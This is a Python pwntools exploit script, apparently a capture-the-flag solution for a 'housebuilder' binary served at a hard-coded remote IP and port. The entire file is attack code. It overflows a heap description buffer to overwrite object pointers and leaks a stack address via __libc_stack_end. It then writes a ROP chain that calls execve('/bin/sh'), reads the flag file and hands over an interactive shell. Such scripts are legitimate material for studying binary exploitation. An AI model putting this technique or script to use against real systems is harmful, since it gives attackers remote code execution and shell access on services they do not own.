#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def create_house(name, room_count, floor_count, people_count):
    p.sendlineafter(b'{$} > ', b'1')
    p.sendlineafter(b'Enter name: ', name)
    p.sendlineafter(b'rooms count: ', str(room_count))
    p.sendlineafter(b'floors count: ', str(floor_count))
    p.sendlineafter(b'peoples count: ', str(people_count))
    
def enter_house(idx):
    p.sendlineafter(b'{$} > ', b'2')
    p.sendlineafter(b'idx: ', str(idx))

def view_house():
    p.sendlineafter(b'} > ', b'1')

def change_desc_house(desc):
    p.sendlineafter(b'} > ', b'2')
    p.sendlineafter(b'description: ', desc)
    
def sell_house():
    p.sendlineafter(b'} > ', b'3')

def exit_house():
    p.sendlineafter(b'} > ', b'4')

def invalid_action():
    p.sendlineafter(b'} > ', b'5')

def list_house():
    p.sendlineafter(b'{$} > ', b'3')

def delete_house(idx):
    p.sendlineafter(b'{$} > ', b'4')
    p.sendlineafter(b'idx: ', str(idx))

def byebye():
    p.sendlineafter(b'{$} > ', b'5')

# p = process('./housebuilder')
p = remote('151.236.114.211', 17174)

HousesList = 0x5d64c0
__libc_stack_end = 0x5d3d50

# gadget
syscall = 0x403c73
pop_rdi_rbp = 0x41432a
pop_rsi = 0x407668
pop_rdx = 0x4044cf
pop_rax = 0x41fcba

create_house(b'LJP', 0x2, 0x3, 0x4)
create_house(b'LJP2', 0x2, 0x3, 0x4)
create_house(b'LJP3', 0x2, 0x3, 0x4)

# Overwrite house1 name ptr
payload = b'a' * 0x400
payload += p64(0) + p64(0x51)
payload += p64(2) + p64(3)
payload += p64(4) + p64(__libc_stack_end)
payload += p64(6)
enter_house(0)
change_desc_house(payload)
exit_house()

# Leak stack
list_house()
p.recvuntil(b'#1')
p.recvuntil(b'Name: ')
stack_ret = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - 0x120
log.info('stack: ' + hex(stack_ret))

# Overwrite house1 name ptr + desc ptr
desc_ptr = stack_ret
payload = b'a' * 0x400
payload += p64(0) + p64(0x51)
payload += p64(2) + p64(3)
payload += p64(4) + p64(__libc_stack_end)
payload += p64(6) + p64(0)
payload += p64(0) + p64(desc_ptr)
enter_house(0)
change_desc_house(payload)
exit_house()

# Write to stack
rop_chain = flat(
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rdi_rbp,
    stack_ret + 0x50,
    0,
    pop_rax,
    59,
    syscall
)
payload = rop_chain + b'/bin/sh\0'
enter_house(1)
change_desc_house(payload)
exit_house()

# Trigger ROP
byebye()

# Pwned
p.sendline('cat /tmp/flag.txt')

p.interactive()
